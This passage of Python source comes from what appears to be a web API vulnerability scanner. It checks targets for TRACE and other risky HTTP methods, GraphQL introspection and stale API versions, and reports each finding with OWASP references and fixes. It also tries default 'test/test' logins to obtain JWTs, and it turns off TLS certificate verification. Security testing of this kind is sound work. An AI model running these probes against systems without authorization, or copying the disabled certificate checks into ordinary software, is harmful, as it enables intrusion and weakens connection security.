    def _test_http_methods(self):
        self.log("data","[METHODS] Testing HTTP methods via OPTIONS...")
        test_urls = [self.base_url + p for p in
                     ["/api/v1/users", "/api/v1/accounts", "/api/v1/admin"]]
        dangerous = {"DELETE","TRACE","CONNECT","PUT"}
        for url in test_urls:
            resp = self._req("OPTIONS", url)
            if not resp: continue
            allow = resp["headers"].get("Allow","") + resp["headers"].get("Access-Control-Allow-Methods","")
            found_methods = {m.strip().upper() for m in allow.split(",")}
            bad = found_methods & dangerous
            if "TRACE" in bad:
                self.finding({
                    "severity":"medium","cvss":4.8,
                    "owasp_category":"A05:2021-Security Misconfiguration",
                    "title":f"HTTP TRACE method enabled — {url}",
                    "description":"TRACE enables Cross-Site Tracing (XST) attacks.",
                    "recommendation":"Disable TRACE method in web server config.",
                    "evidence":f"OPTIONS {url} → Allow: {allow}",
                    "host":self.target,"url":url,
                    "tool":"gator_methods","category":"api",
                })
                self.log("warn",f"[METHODS] TRACE enabled: {url}")

    # ─── GraphQL ──────────────────────────────────────────────
    def _test_graphql(self):
        for path in ["/graphql","/api/graphql","/graphiql"]:
            url = self.base_url + path
            resp = self._req("GET", url)
            if resp and resp["status"] in [200,400]:
                self._test_graphql_endpoint(url)
                break

    def _test_graphql_endpoint(self, url: str):
        """Test GraphQL introspection and basic IDOR."""
        self.log("info",f"[GraphQL] Testing {url}...")
        # Introspection
        resp = self._req("POST", url,
            body=json.dumps({"query": GRAPHQL_FULL_INTROSPECTION}),
            ct="application/json")
        if resp and resp["status"] == 200 and "__schema" in resp["body"]:
            self.log("warn","[GraphQL] 🚨 Introspection enabled!")
            self.finding({
                "severity":       "medium",
                "cvss":           5.3,
                "owasp_category": "API9:2023-Improper Inventory Management",
                "title":          f"GraphQL introspection enabled — {url}",
                "description":    "Full schema introspection reveals all types, queries, mutations.",
                "recommendation": "Disable introspection in production. Use query depth limiting.",
                "evidence":       f"POST {url} with __schema → HTTP 200",
                "host":           self.target,
                "url":            url,
                "tool":           "gator_graphql",
                "category":       "api",
            })

    # ─── API Versioning ───────────────────────────────────────
    def _test_api_versioning(self):
        """Check for old API versions still accessible."""
        self.log("data","[VERSION] Checking for old API versions...")
        old_versions = ["/api/v1/", "/api/v2/", "/api/v3/",
                        "/v1/", "/v2/", "/v3/", "/api/beta/", "/api/internal/"]
        active = []
        for v in old_versions:
            url = self.base_url + v + "accounts"
            resp = self._req("GET", url)
            if resp and resp["status"] not in [404, 400]:
                active.append(v)
        if len(active) > 1:
            self.log("warn",f"[VERSION] Multiple API versions active: {active}")
            self.finding({
                "severity":       "medium",
                "cvss":           5.3,
                "owasp_category": "API9:2023-Improper Inventory Management",
                "title":          f"Multiple API versions active: {', '.join(active)}",
                "description":    "Old API versions may lack newer security controls.",
                "recommendation": "Retire deprecated API versions. Redirect to latest version.",
                "evidence":       f"Active versions: {active}",
                "host":           self.target,
                "url":            self.base_url,
                "tool":           "gator_version",
                "category":       "api",
            })

    # ─── HTTP Helper ─────────────────────────────────────────
    def _req(self, method: str, url: str, body: str = None,
             auth: str = None, ct: str = None,
             headers: dict = None) -> Optional[dict]:
        try:
            data = body.encode() if body else None
            req  = urllib.request.Request(url, data=data, method=method)
            req.add_header("User-Agent","GATOR-PRO/2.0")
            req.add_header("Accept","application/json,*/*")
            if auth:
                req.add_header("Authorization", auth)
            if ct:
                req.add_header("Content-Type", ct)
            if headers:
                for k,v in headers.items():
                    req.add_header(k, v)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx, timeout=8) as resp:
                rbody = resp.read(32768).decode("utf-8", errors="ignore")
                return {"status":resp.status,"headers":dict(resp.headers),"body":rbody}
        except urllib.error.HTTPError as e:
            body_r = ""
            try: body_r = e.read(4096).decode("utf-8", errors="ignore")
            except Exception: pass
            return {"status":e.code,"headers":dict(e.headers),"body":body_r}
        except Exception:
            return None

    def _extract_jwt(self, auth: Optional[str]) -> Optional[str]:
        if not auth:
            return None
        m = re.search(r"Bearer\s+(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)", auth)
        return m.group(1) if m else None

    def _probe_for_jwt(self) -> Optional[str]:
        """Try to get a JWT by probing login endpoint."""
        for path in ["/api/v1/auth/login","/api/v1/login","/login","/api/login"]:
            url = self.base_url + path
            resp = self._req("POST", url,
                body=json.dumps({"username":"test","password":"test"}),
                ct="application/json")
            if not resp: continue
            m = re.search(r'"(?:token|accessToken|access_token)"\s*:\s*"(eyJ[^"]+)"', resp["body"])
            if m:
                return m.group(1)
        return None

    def _split_jwt(self, token: str):
        parts = token.split(".")
        if len(parts) == 3:
            return parts[0], parts[1], parts[2]
        return None, None, None

    def _pad(self, s: str) -> str:
        return s + "=" * (4 - len(s) % 4)
